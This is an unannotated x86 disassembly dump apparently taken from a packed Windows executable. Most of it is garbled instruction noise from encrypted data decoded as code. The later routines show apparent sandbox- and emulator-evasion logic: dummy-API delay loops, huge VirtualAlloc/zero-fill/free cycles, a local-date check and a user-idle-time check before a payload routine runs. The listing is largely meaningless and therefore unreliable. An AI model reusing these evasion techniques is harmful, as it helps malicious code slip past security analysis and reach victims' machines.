out 0xe7 eax
mov cl ah
sub [ esp + edi * 8 + 0x344e9e9b ] esi
ja r-xdata
mov cl ah
lds eax [ ecx + 0x77 ]
ja r-xdata
cld
cli
adc [ eax + 0x773a8732 ] esi
mov al 0x32
scasd [ edi ]
cmp bl [ esi ]
out 0xe7 eax
out 0xe7 eax
mov al 0x32
fwait
and [ edx ] edi
cmp al 0x21
lahf
ja r-xdata
out 0xe7 eax
mov al 0x32
mov esi [ esi + 0x77 ]
ja r-xdata
out 0xf4 eax
fwait
jpo r-xdata
out 0xce eax
inc edi
ja r-xdata
sahf
shl [ ecx + 0x77 ] 0x1
ja r-xdata
mov bh 0x78
out 0x4b eax
mov bh 0x78
js r-xdata
ja r-xdata
xor cl [ ebx + 0x5d9e2c29 ]
ja r-xdata
xor al [ ebx + 0x45589e27 ]
ja r-xdata
ja r-xdata
int 0x9e
dec eax
xor [ edi + 0x77 ] esi
out 0xe7 eax
out 0xe7 eax
out 0xf2 eax
mov esi 0x410af378
out 0x9f eax
xchg ebp eax
cmp esi [ edi + 0x77 ]
sahf
pop ebp
ja r-xdata
out 0xe7 eax
daa
sahf
ja r-xdata
dec esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
and [ eax - 0x480dc4e0 ] ecx
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
adc al 0x5
push ds
hlt
xor [ edi + 0x77 ] dh
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
sub al 0x9e
out 0xe7 eax
out 0xe7 eax
mov al ah
div [ edi + 0x77 ]
ja r-xdata
sahf
out 0xfc eax
xor bh [ edi + 0x2a ]
mov ah 0xe7
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
sub cl [ edi + 0x6732c078 ]
cli
ja r-xdata
aaa
daa
cli
lahf
mov ecx [ eax - 0xd05d878 ]
fwait
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
mov [ ecx ] edx
dec [ edx ]
cmp esp 0x3f029e8f
ja r-xdata
enter 0x775a 0x77
sahf
std
js r-xdata
out 0xe7 eax
loopne r-xdata
mov bh 0x78
pop ebp
sahf
out 0xe7 eax
out 0x2d eax
sbb eax 0x22fe1157
test eax 0x11041d2d
out 0xe7 eax
out 0xe7 eax
out 0x21 eax
mov [ eax ] ah
cmp esi edx
ja r-xdata
out 0x4b eax
out 0x1d eax
push ss
adc esi edi
cmp ch [ edi + 0x11101d2e ]
mov al 0x77
jne r-xdata
adc esi edi
xor dl [ edi + 0x7743a39e ]
ja r-xdata
cld
scasd [ edi ]
mov cl [ eax - 0x7f03d878 ]
lahf
xchg [ 0xffffffffb3f47777 ] dh
sahf
or [ ebx + 0x77 ] ebp
ja r-xdata
mov [ edi ] ah
cli
fwait
out 0xe7 eax
out 0x2e eax
cli
out 0xe7 eax
daa
mov [ ecx ] ah
adc ebx [ esi + 0x777762fd ]
out 0xe7 eax
out 0x88 eax
sub eax 0xfe11011d
and dh [ ebx + 0x69ea544 ]
outsb
ja r-xdata
ja r-xdata
adc esi edi
jbe r-xdata
setle [ edx ]
push 0xe7e77777
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
out 0xe7 eax
adc esi edi
xor cl [ ebx - 0x598dd06 ]
ja r-xdata
mov bh 0x78
r-xdata
mov [ eax ] ah
pop ebx
cli
lahf
mov ecx [ eax + 0x419f2788 ]
pop eax
ja r-xdata
mov ch 0x11
sbb eax 0x101d2e01
cld
out 0x28 eax
out 0xe7 eax
daa
sahf
jmp 0xffffffffe7c0353a
xor al 0x77
ja r-xdata
out 0xe7 eax
out 0xe7 eax
sub eax 0xfe11571d
and ch [ ecx + 0x11041d2d ]
and al [ ebp + 0x78df9e2d ]
ja r-xdata
mov [ edx ] al
lahf
ja r-xdata
cld
and bh [ ebx - 0x62 ]
jpo r-xdata
outsb
ja r-xdata
push ebx
ja r-xdata
cmp edi [ ebp + 0x77 ]
ja r-xdata
out 0x88 eax
shl [ ebx - 0x60888889 ] 0x4b
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cld
[ edi ]
mov cl [ eax + 0x53929e88 ]
mov [ eax + 0x32fae7e7 ] cl
mov esp [ edi ]
and [ eax + 0x2e9e7b02 ] cl
jae r-xdata
cld
cld
outsd
out 0x2f eax
sbb eax 0x32fe1152
test [ edi ] ebp
push edx
adc esi edi
xor al [ ebp + 0x111e1d2f ]
cli
xor ah [ edi + 0x7734399e ]
ja r-xdata
xor dl [ ebx + 0x11121d2f ]
out 0xe7 eax
out 0x88 eax
add bh [ ebx + 0x1d ]
ja r-xdata
ja r-xdata
adc al 0x8a
mov [ eax - 0xd87410e ] cl
test [ ebx + 0x77 ] edi
ja r-xdata
mov cl [ eax + 0x78bef288 ]
test [ ebx + 0x77 ] edi
ja r-xdata
inc esi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
push 0x77
ja r-xdata
hlt
mov [ 0x777b169e ] eax
ja r-xdata
loope r-xdata
fwait
mov cl [ eax + 0x308c9f88 ]
ja r-xdata
out 0xf7 eax
ja r-xdata
ja r-xdata
xor [ edi + 0x77 ] esi
lahf
dec ebx
ja r-xdata
test eax 0xe777776a
mov bh 0x78
pop ebp
ja r-xdata
xor edx [ ebx + 0x6f ]
0xe777777b 0xe7e7
xchg [ 0xf218877 ] ebx
sahf
add ch [ eax + 0x77 ]
ja r-xdata
out 0xe7 eax
and bh ah
sahf
insd
cmp esi [ edi + 0x77 ]
js r-xdata
out 0xe7 eax
and [ ebx ] edi
sahf
mov [ edi + 0x77 ] edi
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x1f eax
test eax 0x88d4a01a
sar [ ebx - 0x61888889 ] 0x83
xor bl [ edi + 0x7f32fc27 ]
adc esi edi
cmp dl [ ebp + 0x7769679f ]
ja r-xdata
cli
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xf2 eax
mov [ esi + 0x77773346 ] bl
ja r-xdata
out 0xe7 eax
enter 0x7ccf 0x77
ja r-xdata
daa
cli

jpo r-xdata
mov edi 0x777bea9e
ja r-xdata
mov [ edx ] al
jpo r-xdata
xor bh [ edi - 0x62 ]
inc eax
outsb
ja r-xdata
adc esi edi
xor al [ ecx + 0x331db744 ]
adc esi edi
xor cl [ edi + 0x7746089e ]
ja r-xdata
ja r-xdata
sahf
r-xdata
aas
xor eax 0xe7e77777
mov al al
mov bl 0x77
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
js r-xdata
xor edx [ ebx + 0x6b ]
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
sahf
ja r-xdata
out 0xe7 eax
hlt
mov bl 0x8b
mov [ eax + 0x354a9e27 ] cl
ja r-xdata
sub cl [ edi + 0x77 ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x9e eax
sbb eax 0x32fe111e
sub [ edi ] 0x11
fwait
and al 0x21
and ah bh
out 0x22 eax
cld
inc esp
ja r-xdata
and al 0x4b
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
inc esp
dec esp
ja r-xdata
inc esp
movsd [ edi ] [ esi ]
daa
ja r-xdata
cld
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
lahf
or [ ebp + 0x77 ] edx
ja r-xdata
add bh [ ebx - 0x4 ]
push 0xf4777764
or [ edi + 0x77 ] bh
js r-xdata
mov bh 0x21
and dh bh
xor cl [ ebx - 0x170cd02 ]
xor al [ ebx + 0x7755879e ]
ja r-xdata
out 0x1d eax
inc esi
adc esi edi
and ch [ ebx - 0x7774b562 ]
mov [ 0x2e9e2f16 ] bl
arpl [ edi + 0x77 ] si
out 0x37 eax
sbb eax 0x32fe1133
hlt
out 0xe7 eax
out 0xf2 eax
mov esi 0x773b479e
ja r-xdata
cli
cmp cl bh
cli
xor bl bh
sahf
nop
dec edx
ja r-xdata
out 0xe7 eax
out 0xf7 eax
or ah [ edi + 0x76 ]
js r-xdata
sahf
mov esi 0xe7777727
out 0xe7 eax
xor esi [ edi + 0x77 ]
fidivr [ ebx + 0x77 ]
hlt
cld
fwait
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
inc edi
daa
cli
xor dl [ edi - 0x7772b062 ]
mov [ ecx ] dl
dec [ edx ]
loope r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
test [ edx ] 0xf2787667
inc esi
inc esi
ja r-xdata
mov dh bh
jecxz r-xdata
hlt
out 0xe7 eax
out 0xf2 eax
mov esi 0x8873f378
mov [ eax - 0x6761480e ] cl
mov [ eax - 0x6403dd78 ] ecx
dec edx
aas
ja r-xdata
ja r-xdata
and al 0x9e
aaa
je r-xdata
div [ edi + 0x77 ]
ja r-xdata
out 0xe7 eax
out 0xe7 eax
lahf
cli
mov [ eax + 0x774f2a9f ] cl
ja r-xdata
ja r-xdata
int1
int1
mov bh 0x77
ja r-xdata
cli
ja r-xdata
lahf
sub cl [ edi + 0x77 ]
loop r-xdata
out 0xe7 eax
out 0xe7 eax
sbb [ edi ] ch
sbb eax 0x32fe1107
cmpsd [ esi ] [ edi ]
ja r-xdata
adc ah bh
scasd [ edi ]
adc esi edi
sub dl [ ecx - 0x26153bc ]
daa
ja r-xdata
cli
cli
jpo r-xdata
mov [ eax + 0x4a819e88 ] cs
mov [ edx ] al
cmp bh [ edi - 0x6 ]
add ah [ edi - 0x61 ]
aaa
pop edx
ja r-xdata
ja r-xdata
out 0xe7 eax
sbb eax 0x11affc10
cld
mov [ edi + 0x777735b2 ] ebx
hlt
out 0xe7 eax
inc esp
mov [ eax ] ah
sahf
add ecx [ edx + 0x77 ]
ja r-xdata
cli
mov [ 0x2788888a ] eax
js r-xdata
jg r-xdata
sahf
sbb al 0x6e
ja r-xdata
pop ebp
xor esi [ edi + 0x77 ]
out 0xe7 eax
out 0xe7 eax
pop ds
cli
[ esi ] [ edi ]
mov cl [ eax - 0x61dbd878 ]
xor eax 0xe777776a
mov al 0x32
mov ebx 0x12070e1f
ja r-xdata
dec edx
0x8aa3
mov [ eax + 0x21882427 ] cl
arpl si di
ja r-xdata
mov cl ah
out 0xe7 eax
out 0xe7 eax
cli
[ eax + ecx * 4 + 0x32aa9f88 ] ecx
ja r-xdata
and bh ah
out 0xe7 eax
out 0xe7 eax
out 0x88 eax
add ah [ edi - 0x62 ]
out 0xe7 eax
out 0xe7 eax
and al 0x88
and [ ebx + 0x24 ] eax
sahf
xor ebp [ ecx + 0x77 ]
ja r-xdata
sahf
add al 0x6a
ja r-xdata
and al 0x88
and [ ebx - 0x2 ] esp
daa
sbb eax 0xdbe18877
ja r-xdata
cld
cmp bh [ edi - 0x6 ]
out 0xe7 eax
out 0x20 eax
sahf
dec esi
r-xdata
ja r-xdata
adc esi edi
xor al [ edi ]
cli
xor ah [ ebx + 0x11 ]
inc [ edx ]
pop ds
cld
add cl [ ebx ]
daa
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
hlt
shl [ eax + 0x77 ] cl
out 0xe7 eax
out 0xe7 eax
mov [ edx ] al
sahf
ja r-xdata
out 0xe7 eax
pop ds
lahf
mov [ 0xfffffffff288888a ] eax
mov bh 0x9e
pop ebp
jae r-xdata
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
not ebx
ja r-xdata
hlt
cld
mov cl 0x9e
out 0x9e eax
and eax 0xe7777774
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
pop ds
cli
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x78 eax
xchg ebp eax
cmp [ edi + 0x77 ] dh
out 0xe7 eax
adc esi edi
and cl bl
sub eax 0xfe11151d
and cl cl
sub eax 0x776a929e
sahf
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfe eax
or cl [ ebx + 0x774d8b9e ]
ja r-xdata
xchg esi eax
jne r-xdata
out 0xe7 eax
out 0x1f eax
sbb eax 0x47771f73
ja r-xdata
inc edi
ja r-xdata
mov al 0x32
cmpsd [ esi ] [ edi ]
add eax 0x9f575701
xor bh [ ebx + 0x12070e1f ]
ja r-xdata
loope r-xdata
cli
dec ecx
push 0x77
ja r-xdata
push edi
lahf
ja r-xdata
ja r-xdata
xchg edx eax
push 0x77
out 0xe7 eax
hlt
and [ eax + ecx * 4 ] ah
je r-xdata
mov cl 0x9f
pop ds
dec edi
ja r-xdata
ja r-xdata
ja r-xdata
jns r-xdata
ja r-xdata
ja r-xdata
ja r-xdata
mov [ eax - 0x4c0b5004 ] cl
jpo r-xdata
ja r-xdata
stc
mov bh 0x77
ja r-xdata
das
sbb eax 0x7d9e9e12
ja r-xdata
ja r-xdata
mov [ ecx ] ah
dec ebx
inc esp
mov bh 0x4e
or cl [ ebx + 0x28b7e378 ]
sub al 0x9e
mov bh [ ebx ]
ja r-xdata
pop edi
ja r-xdata
ja r-xdata
lodsb [ esi ]
push ebx
out 0x77 eax
ja r-xdata
enter 0x775b 0x77
out 0xe7 eax
out 0xf7 eax
or ah [ edi + 0x75 ]
js r-xdata
push ds
mov bh 0xf3
sub [ esi + 0x77776a04 ] bl
out 0xe7 eax
inc esp
mov bh 0x37
sahf
sub [ ebp + 0x77 ] 0xacf37877
pop edx
ja r-xdata
pop ds
dec edi
inc eax
dec ecx
and [ eax ] 0xfffffffe
int1
ja r-xdata
xor edx [ ebx + 0x67 ]
dec esp
mov ah 0x78
leave

jo r-xdata
out 0xe7 eax
lahf
sahf
xor al 0x74
ja r-xdata
mov bl 0x7b
[ esi ]
sahf
sub al 0x61
out 0xe7 eax
test [ edx ] 0xf2787567
ja r-xdata
jg r-xdata
cli
dec [ edx ]
mov ebx [ esi + 0x77774d8b ]
ja r-xdata
ja r-xdata
ja r-xdata
sbb eax 0x71d2f18
adc esi edi
xor ah [ edi - 0x61ede2d1 ]
sahf
jge r-xdata
ja r-xdata
loop r-xdata
out 0xe7 eax
js r-xdata
r-xdata
ja r-xdata
lds esi [ eax + 0x77 ]
ja r-xdata
cli
mov cl [ eax + 0x7fe3fe88 ]
je r-xdata
dec ebp
ja r-xdata
ja r-xdata
xchg [ edx + 0x1e ] ch
aaa
mov cl al
mov bl 0x77
ja r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x1f eax
loope r-xdata
and al 0x88
fwait
sahf
out 0xe7 eax
out 0xe7 eax
out 0x22 eax
cld
jne r-xdata
out 0x1d eax
or [ eax + 0x31d2f88 ] 0x11
out 0xe7 eax
out 0xf4 eax
mov dh 0x63
ja r-xdata
xor [ edi ] ecx
lahf
add al 0x5f
fwait
mov cl [ eax - 0x72816178 ]
mov [ eax + 0x2c29b744 ] cl
mov esi 0xe7e7e7b4
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x2d eax
adc esi edi
xor bl [ ecx ]
adc esi edi
and dl [ ecx ]
cld
cmpsd [ esi ] [ edi ]
inc esp
mov bh 0x11
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfa eax
ja r-xdata
ja r-xdata
sub al 0x61
ja r-xdata
sbb eax 0x69339e01
ja r-xdata
sub_48dd94
mov esp [ esi ]
sahf
inc [ ecx + 0x77 ]
ja r-xdata
cli
cmp dl [ edi - 0x74f877da ]
cld
jg r-xdata
out 0xe7 eax
out 0xe7 eax
inc esp
mov bh 0x28
sub [ esi + edi * 4 ] ebp
mov ah 0xe7
adc esi edi
sub ah [ 0xfffffffffe11affc ]
sub ah [ ebx ]
cld
mov bh ah
out 0xe7 eax
out 0xe7 eax
cld
xor cl [ ebx - 0x18184b42 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfe eax
sub dl [ edi - 0x777e0962 ]
mov bh ah
out 0xe7 eax
out 0xe7 eax
out 0xf4 eax
mov [ eax - 0x7775b462 ] cs
mov bh ah
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x9e eax
sbb al 0xa8
mov [ eax - 0x77181819 ] cl
add bl [ ebx - 0x617cd502 ]
xor al 0x5f
ja r-xdata
cmp bh [ edi - 0x4 ]
aaa
fwait
ja r-xdata
mov edi 0x2788888a
mov [ ecx ] ah
pop ebx
dec edi
sub ah [ edi + 0x78 ]
xchg ebx eax
xchg ebp eax
mov [ eax - 0x75400d06 ] cl
mov [ eax - 0x3c0d05d9 ] cl
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xb0 eax
xor dh [ edi + 0x3a3a2119 ]
mov al 0x32
mov edi 0x571b0507
sahf
mov al [ 0xffffffffe7888893 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
scasb [ edi ]
adc esi edi
sub ah [ ecx ]
cld
scasd [ edi ]
adc esi edi
sub ch [ edi ]
inc esp
lodsb [ esi ]
adc esi edi
sub ch [ 0xffffffffc39ea8fc ]
jge r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x22 eax
cld
fwait
neg [ ebx + 0x7777730b ]
hlt
sub_48fd4e
popad
ja r-xdata
out 0xe7 eax
out 0xfc eax
xor cl [ edi - 0x4b41d3d8 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0x11 eax
dec [ edx ]
add [ eax + ecx * 4 + 0x11 ] 0xfffffffe
and dh [ edi ]
cld
scasd [ edi ]
inc esp
movsd [ edi ] [ esi ]
sbb eax 0x2afe1100
xchg ebx eax
adc esi edi
and dh [ 0x112daefc ]
inc esp
mov [ esi + 0xb ] cl
push ebx
inc ebx
js r-xdata
js r-xdata
jno r-xdata
mov [ eax - 0x768160d2 ] cl

js r-xdata
mov [ eax - 0x77607f62 ] cl
mov bh ah
out 0xe7 eax
out 0xe7 eax
cld
mov [ 0xfffffffff288889a ] al
mov [ eax - 0xd ] bh
sbb [ ecx ] edx
ja r-xdata
mov [ ecx + 0x77 ] esp
ja r-xdata
0x88f28888 0xf378
or edx [ ebx + 0x53 ]
ja r-xdata
lahf
enter 0x8881 0x88
sbb eax 0xc732fa67
and [ edi ] esp
daa
out 0xe7 eax
out 0x1d eax
adc eax 0x88a14b9e
mov bh ah
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
and bh ah
fwait
hlt
lahf
les eax [ ecx - 0x61de7778 ]
test [ ecx + 0x77 ] ah
ja r-xdata
push ebp
jle r-xdata
sahf
shl [ edi + ecx * 2 ] 0x27
js r-xdata
out 0xe7 eax
out 0xe7 eax
out 0x88 eax
and [ ebx ] ch
sahf
mov al 0x67
ja r-xdata
xor al 0x69
daa
mov [ edi + ebp ] al
cld
mov cl 0x20
lahf
in al dx
pushfd
mov [ eax - 0x1984c0c ] cl
xor edx [ ebx + 0x57 ]
mov bh 0x78
mov eax 0xfa777761
cmp al 0x3f
cld
cmp al 0x2f
lahf
or ch [ esi - 0x60d17778 ]
jle r-xdata
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
cli
adc ecx [ eax + 0x27218888 ]
sbb [ edi - 0x18187778 ] 0xe7
xor edx [ ebx + 0x6b ]
dec esp
xor al 0x6f
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xfc eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
mov [ eax ] ah
sub ebx [ esi + 0x777767b0 ]
mov [ eax + 0x78768ff4 ] cl

sub_48fdf8
sub dl [ ecx - 0x7ef501ef ]
adc esi edi
and ch [ ebx ]
sbb eax 0x191d2d1e
adc esi edi
and ch [ ecx ]
sub eax 0xfe11131d
and dl [ edi ]
sub eax 0xfe11151d
and dl [ 0x22fe112d ]
adc ebx [ 0xffffffffb1ff9e10 ]
mov [ eax - 0x70f50119 ] cl
sahf
iretd
sub_490156
pushfd
mov [ eax + 0x7566ba1f ] cl
adc bl [ esi + 0x77777475 ]
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
out 0xe7 eax
enter 0x7673 0x77
ja r-xdata
out 0xe7 eax
cli

sub_490177
mov [ eax - 0x43b361d9 ] cl
mov [ eax - 0x18181819 ] cl
out 0xe7 eax
out 0xe7 eax
out 0x27 eax
sahf
sub edi [ edi - 0x18187778 ]
out 0xe7 eax
out 0xe7 eax
out 0xfe eax
xor al [ ebx + 0x278332fa ]
sahf
ror [ esi - 0x18187778 ] 0xe7
out 0xe7 eax
out 0x1d eax
ja r-xdata
pushfd
mov [ eax - 0x4b2784e1 ] cl
int3
sub_4916a8
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ebx 0x1
mov ecx ebx
nop
nop
add ecx eax
mov [ ecx ] 0x3a
inc ebx
dec edx
jne r-xdata
sub_4916c8
push ebx
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call CreateMDIWindowA
test eax eax
jne r-xdata
pop ebx
retn
call GetLastError
cmp eax 0x578
jne r-xdata
push 0x0
push 0x0
call GetMenuItemID
nop
nop
mov ebx 0x903ee89
nop
nop
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1e5f99cf
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx 0x1e5f99cf
xor edx edx
mov eax ebx
call sub_4916a8
push 0x0
push 0x0
call GetMenuItemID
nop
nop
push 0x8000
push 0x0
push ebx
call VirtualFree
nop
nop
mov ebx 0x9b82
jmp r-xdata
push 0x0
push 0x0
call GetMenuItemID
dec ebx
jne r-xdata
nop
nop
push 0x0
call sub_48b7fc
nop
nop
sub_491770
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_491795
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49179c
retn
sub_4917a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push sub_491908
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49190f
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push 0x0
push 0x0
call SelectClipRgn
nop
call GetLastError
cmp eax 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_402a1c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c998
test eax eax
je r-xdata
nop
nop
nop
jmp r-xdata
mov ebx 0x1399
jmp r-xdata
push 0x0
push 0x0
call GetMenuItemID
dec ebx
jne r-xdata
push 0x0
push 0x0
call GetMenuItemID
mov ebx 0x235a8
push 0x0
push 0x0
call GetMenuItemID
dec ebx
jne r-xdata
push 0x4
push 0x3000
push 0x1ba06e03
push 0x0
call VirtualAlloc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx 0x1ba06e03
xor edx edx
mov eax ebx
call sub_4916a8
push 0x0
push 0x0
call GetMenuItemID
push 0x8000
push 0x0
push ebx
call VirtualFree
mov ebx 0x8af3
nop
nop
jmp r-xdata
push 0x0
push 0x0
call GetMenuItemID
dec ebx
jne r-xdata
xor ebx ebx
xor edi edi
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jb r-xdata
nop
cmp ebx 0xf
jle r-xdata
nop
nop
cmp edi [ esi + 0x4 ]
je r-xdata
mov [ esi ] 0x8
nop
nop
push esi
call GetLastInputInfo
nop
call GetTickCount
sub eax [ esi + 0x4 ]
cmp eax 0x65
jae r-xdata
call sub_4916c8
mov edi [ esi + 0x4 ]
inc ebx
sub_491960
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_49197f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_491986
retn
sub_491988
inc ebp
add [ eax ] al
add [ eax - 0x2fffb6e7 ] dl
pop edi
inc eax
add [ eax - 0x3bffbfa1 ] ah
pop ebp
inc eax
add [ eax + 0x5d ] dh
inc eax
add [ eax + 0x60 ] cl
inc eax
add [ eax ] bl
pushad
inc eax
add [ esi + ebp * 2 + 0x6e740040 ] ah
inc eax
add ah bl
outsb
inc eax
add [ esi + ebp * 2 + 0x18680040 ] ch
inc ecx
add [ eax ] bh
sbb [ ecx ] al
cld
jno r-xdata
add [ eax + 0x4e ] ah
add ah cl
jno r-xdata
inc edx
inc ecx
add [ eax ] bl
adc [ ecx ] al
xor [ eax ] bl
inc ecx
add al ah
pop ss
inc ecx
add [ eax - 0x27ffbe50 ] cl
scasd [ edi ]
inc ecx
add [ ecx + ecx * 2 ] ch
inc edx
add ah bh
dec eax
inc edx
add [ eax + 0x6000424e ] dl
dec esi
inc edx
add [ eax - 0x7c ] ch
inc edx
add [ eax ] bh
test [ edx ] al
xor [ edx + eax * 2 + 0x42840000 ] al
add al bh
add [ edx ] 0xffffffc8
add [ edx ] 0xc
test [ edx ] eax
fadd [ edx + eax * 2 + 0x43619000 ]
add [ eax + 0x61 ] ah
inc ebx
add [ eax - 0x40 ] al
inc ebx
add [ eax ] dl
rol [ ebx ] 0x9c
inc edx
add [ edi + 0x42 ] ch
add al dl
je r-xdata
add [ edi + 0x42 ] al
add [ edi ] al
inc edx
add [ edi + edx * 2 ] cl
inc edx
add ah bl
push esi
inc edx
add [ edi + ecx * 2 + 0x4f5c0042 ] cl
inc edx
add [ esp + esi * 4 + 0x41 ] bl
add [ esp + esi * 4 ] ch
inc ecx
add al dh
inc edi
inc edx
add [ edi + eax * 2 ] bl
inc edx
add [ eax + 0xf ] dl
inc ebp
add [ eax ] ah
cmovne eax [ eax ]
dec esp
push edi
inc edx
add [ edi + edx * 2 ] bl
inc edx
add [ esi * 2 + 0x749c0045 ] cl
inc ebp
add [ ecx + edi * 2 + 0x79640042 ] dl
inc edx
add [ ebx + eax * 4 ] bh
inc edx
add al ch
add [ edx ] 0xa0
test [ edx ] al
jo r-xdata
add [ eax - 0x24 ] al
inc eax
add al al
fiadd [ eax ]
lodsb [ esi ]
in al 0x40
add [ esp + 0x40 ] bh
add [ esi + ecx + 0x41 ] dl
add ah bl
or eax 0x10480041
pushad
inc ebx
add [ eax + 0x70004351 ] ch
push ecx
inc ebx
add ah al
pop edi
inc ebx
add [ edi + ebx * 2 + 0x2a940043 ] dl
inc ebx
add [ edx + ebp + 0x43 ] ah
add [ edx + ebp ] cl
inc ebx
add al dl
sub [ ebx ] eax
test al 0xc1
inc ebx
add [ eax - 0x3f ] bh
inc ebx
add [ eax ] al
popad
inc ebx
add [ eax + 0x58004360 ] dh
popad
inc ebx
add [ eax ] cl
popad
inc ebx
add al al
and eax [ ebx ]
nop
and eax [ ebx ]
adc [ ebx + 0x43 ] ah
add [ eax + 0x38004362 ] bl
outsd
inc ebx
add ah dh
outsb
inc ebx
add ah dl
fld [ eax + eax + 0x6c ]
fld [ eax + eax - 0x70 ]
inc esp
add [ eax - 0xd ] ah
inc esp
add [ esi + ecx * 8 + 0x43 ] dh
add ah bh
int 0x43
add al ch
ja r-xdata
add [ esp + esi * 2 - 0x7a93ffbe ] dl
inc edx
add [ eax * 4 - 0x7a5bffbe ] bh
inc edx
add [ ebp + eax * 4 + 0x42 ] dh
add ah ch
mov ch 0x42
add [ eax + 0x600042b5 ] dl
and eax [ ebx ]
sbb [ ebx ] ah
inc ebx
add al al
add [ edx ] 0xffffff90
add [ edx ] 0xffffff88
add [ edx ] 0x58
add [ edx ] 0x2c
pushad
inc ebx
add ah ah
pop edi
inc ebx
add [ eax + 0x604c0043 ] dl
mov es [ edi ]
push 0x3800484d
dec ebp
dec eax
add ah dl
pop ecx
dec eax
add [ ecx + ebx * 2 - 0x4cc3ffb8 ] ah
dec eax
add [ ebx + esi * 4 ] al
dec eax
add [ eax + 0x70004917 ] ah
pop ss
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x19 ] ah
dec ecx
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax sub_491988
call sub_405f5c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463084
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46309c
mov eax [ rw-data ]
